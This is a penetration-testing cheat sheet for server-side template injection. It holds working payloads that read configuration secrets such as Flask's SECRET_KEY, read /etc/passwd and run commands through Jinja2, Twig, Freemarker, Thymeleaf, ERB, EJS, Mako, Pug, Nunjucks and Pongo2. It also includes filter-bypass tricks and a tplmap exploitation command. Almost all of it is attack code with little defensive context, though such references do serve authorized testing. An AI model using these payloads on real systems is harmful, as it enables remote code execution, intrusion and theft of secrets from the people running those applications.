# Server-Side Template Injection (SSTI)

## Detection

Inject math expressions in user input fields:

| Payload | Engines |
|---|---|
| `{{7*7}}` | Jinja2, Twig, Nunjucks |
| `${7*7}` | Freemarker, Thymeleaf, Mako |
| `<%= 7*7 %>` | ERB (Ruby), EJS (Node) |
| `#{7*7}` | Pug/Jade, Slim |
| `{7*7}` | Smarty |
| `${{7*7}}` | Thymeleaf (Spring) |

If `49` appears in the response, SSTI is confirmed.

### Engine Identification

Use differential payloads:
- `{{7*'7'}}` → `7777777` (Jinja2) vs `49` (Twig)
- `<%= 7*7 %>` → only works in ERB/EJS

## Jinja2 (Python / Flask)

### Config Access

```
{{config}}
{{config.SECRET_KEY}}
{{request.environ}}
```

### RCE

```python
# Via subprocess
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}

# Find the right subclass index (os._wrap_close or subprocess.Popen)
{% for x in ''.__class__.__mro__[1].__subclasses__() %}
{% if 'wrap_close' in x.__name__ %}{{x.__init__.__globals__['popen']('id').read()}}{% endif %}
{% endfor %}

# Via __builtins__
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Via config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via lipsum (Jinja2 built-in)
{{lipsum.__globals__['os'].popen('id').read()}}

# Via cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Filter Bypass

| Filter | Bypass |
|---|---|
| `_` blocked | `\x5f`, `request.args.x` (pass `x=__class__` in URL) |
| `.` blocked | `attr()` filter: `''|attr('__class__')` |
| `[` blocked | `__getitem__` or `|attr()` |
| `{{` blocked | `{% print(...) %}` or `{% if ... %}yes{% endif %}` |
| Keywords blocked | String concatenation: `'__cla'+'ss__'` |

## Twig (PHP)

```php
// Read file
{{'/etc/passwd'|file_excerpt(0,100)}}

// RCE
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}

// Twig 3.x (no _self.env):
{{['id']|map('system')}}
{{['id']|filter('system')}}
```

## Freemarker (Java)

```java
// RCE
${"freemarker.template.utility.Execute"?new()("id")}

// File read
${object.getClass().forName("java.io.File").getConstructor(String).newInstance("/etc/passwd")}
```

## Thymeleaf (Java / Spring)

```java
// RCE via SpEL (Spring Expression Language)
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec('id')}__::x

// Path-based injection
/path/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

## ERB (Ruby)

```ruby
<%= system('id') %>
<%= `id` %>
<%= File.read('/etc/passwd') %>
```

## EJS (Node.js)

```javascript
<%= process.mainModule.require('child_process').execSync('id') %>
```

## Mako (Python)

```python
${__import__('os').popen('id').read()}
<% import os; x = os.popen('id').read() %>${x}
```

## Pongo2 (Go)

```
{{ "id" | exec }}
```

## Pug / Jade (Node.js)

```javascript
- var x = global.process.mainModule.require('child_process').execSync('id')
#{x}
```

## Nunjucks (Node.js)

```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

## Tools

```bash
tplmap -u "<url>?name=test"             # automated SSTI detection and exploitation
```
